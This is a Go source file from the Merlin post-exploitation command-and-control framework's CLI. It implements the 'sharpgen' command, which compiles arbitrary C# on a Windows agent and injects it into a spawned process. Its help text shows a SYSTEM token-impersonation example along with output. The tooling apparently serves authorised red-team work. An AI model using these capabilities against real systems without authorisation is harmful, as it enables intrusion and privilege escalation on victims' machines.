/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package sharpgen

import (
	// Standard
	"fmt"
	"log/slog"
	"strings"

	// 3rd Party
	"github.com/chzyer/readline"
	"github.com/google/uuid"
	"github.com/mattn/go-shellwords"

	// Internal
	"github.com/Ne0nd0g/merlin-cli/commands"
	"github.com/Ne0nd0g/merlin-cli/entity/help"
	"github.com/Ne0nd0g/merlin-cli/entity/menu"
	"github.com/Ne0nd0g/merlin-cli/entity/os"
	"github.com/Ne0nd0g/merlin-cli/message"
	"github.com/Ne0nd0g/merlin-cli/services/rpc"
)

// Command is an aggregate structure for a command executed on the command line interface
type Command struct {
	name   string      // name is the name of the command
	help   help.Help   // help is the Help structure for the command
	menus  []menu.Menu // menu is the Menu the command can be used in
	native bool        // native is true if the command is executed by an Agent using only Golang native code
	os     os.OS       // os is the supported operating system the Agent command can be executed on
}

// NewCommand is a factory that builds and returns a Command structure that implements the Command interface
func NewCommand() *Command {
	var cmd Command
	cmd.name = "sharpgen"
	cmd.menus = []menu.Menu{menu.AGENT}
	cmd.os = os.WINDOWS
	description := "Compile & execute arbitrary C# code."
	// Style guide for usage https://developers.google.com/style/code-syntax
	usage := "sharpgen <C# code> [spawnto] [spawnto_args]"
	example := "Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» " +
		"sharpgen \"new SharpSploit.Credentials.Tokens().GetSystem()\"\n" +
		"\t[-] Created job oeOBXfBuPS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786\n" +
		"\t[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job oeOBXfBuPS\n" +
		"\tGetting system...\n" +
		"\tImpersonate NT AUTHORITY\\SYSTEM...\n" +
		"\tProcesses for NT AUTHORITY\\SYSTEM: 25\n" +
		"\tAttempting to impersonate: NT AUTHORITY\\SYSTEM\n" +
		"\tAttempting to impersonate: NT AUTHORITY\\SYSTEM\n" +
		"\tImpersonated: NT AUTHORITY\\SYSTEM\n" +
		"\tTrue"
	notes := "This command only works on Windows.\n\n" +
		"\tThe sharpgen command leverages Ryan Cobb’s SharpGen project and the .NET Core 2.1 SDK to " +
		"dynamically compile and execute .NET assemblies. After assembly is compiled, the same steps documented in " +
		"execute-assembly are followed. SharpGen also leverages functionality from the SharpSploit project that can be " +
		"called directly from this shargen command. This command uses a hardcoded output that places compiled " +
		"executables to the Merlin root directory as sharpgen.exe.\n\n" +
		"\tFor more granular control and additional configuration options, use the windows/x64/csharp/misc/SharpGen " +
		"module.\n\n" +
		"\tSharpGen is git a submodule in the data/src/cobbr/SharpGen directory. From this directory, run the dotnet " +
		"build -c release command to build the SharpGen.dll executable.\n" +
		"\tThe <C# code> positional argument is the .NET code you want to compile and execute. All code is automatically" +
		" wraped in Console.WriteLine(); and it does not need to be included again. All other arguments are optional. " +
		"The spawnto argument is the process that will be started on the target and where the shellcode will be " +
		"injected and executed. If a spawnto is not provided, C:\\WIndows\\System32\\dllhost.exe will be used. " +
		"The spawnto_args value is used as an argument when starting the spawnto process.\n\n" +
		"\tUse \\ to escape any characters inside of the code argument and use quotes to enclose the entire code " +
		"argument (e.g., \"new Tokens().MakeToken(\\\"RAstley\\\", \\\"\\\", \\\"P@ssword\\\")\")\n\n" +
		"\tReferences:\n" +
		"\t\t- https://github.com/cobbr/SharpGen\n" +
		"\t\t- https://github.com/cobbr/SharpSploit\n" +
		"\t\t- https://dotnet.microsoft.com/download/dotnet-core/2.1"
	cmd.help = help.NewHelp(description, example, notes, usage)
	return &cmd
}

// Completer returns the data that is displayed in the CLI for tab completion depending on the menu the command is for
// Errors are not returned to ensure the CLI is not interrupted.
// Errors are logged and can be viewed by enabling debug output in the CLI
func (c *Command) Completer(menu.Menu, uuid.UUID) readline.PrefixCompleterInterface {
	return readline.PcItem(c.name)
}

// Do executes the command and returns a Response to the caller to facilitate changes in the CLI service
// m, an optional parameter, is the Menu the command was executed from
// id, an optional parameter, used to identify a specific Agent or Listener
// arguments, and optional, parameter, is the full unparsed string entered on the command line to include the
// command itself passed into command for processing
func (c *Command) Do(m menu.Menu, id uuid.UUID, arguments string) (response commands.Response) {
	slog.Debug("entering into function", "menu", m, "id", id, "arguments", arguments)
	// Parse the arguments
	args, err := shellwords.Parse(arguments)
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error parsing the arguments: %s", err))
		return
	}

	// Validate at least one argument, in addition to the command, was provided
	if len(args) < 2 {
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s' command requires at least one argument\n%s", c, c.help.Usage()))
		return
	}

	// Check for help first
	switch strings.ToLower(args[1]) {
	case "help", "-h", "--help", "?", "/?":
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s' command help\n\nDescription:\n\t%s\nUsage:\n\t%s\nExample:\n\t%s\nNotes:\n\t%s", c, c.help.Description(), c.help.Usage(), c.help.Example(), c.help.Notes()))
		return
	}

	// Set the SpawnTo if one wasn't provided
	if len(args) < 3 {
		args = append(args, "C:\\Windows\\System32\\dllhost.exe")
	}

	response.Message = rpc.SharpGen(id, args[1:])
	return
}

// Help returns a help.Help structure that can be used to view a command's Description, Notes, Usage, and an example
func (c *Command) Help(menu.Menu) help.Help {
	return c.help
}

// Menu checks to see if the command is supported for the provided menu
func (c *Command) Menu(m menu.Menu) bool {
	for _, v := range c.menus {
		if v == m || v == menu.ALLMENUS {
			return true
		}
	}
	return false
}

// OS returns the supported operating system the Agent command can be executed on
func (c *Command) OS() os.OS {
	return c.os
}

// String returns the unique name of the command as a string
func (c *Command) String() string {
	return c.name
}
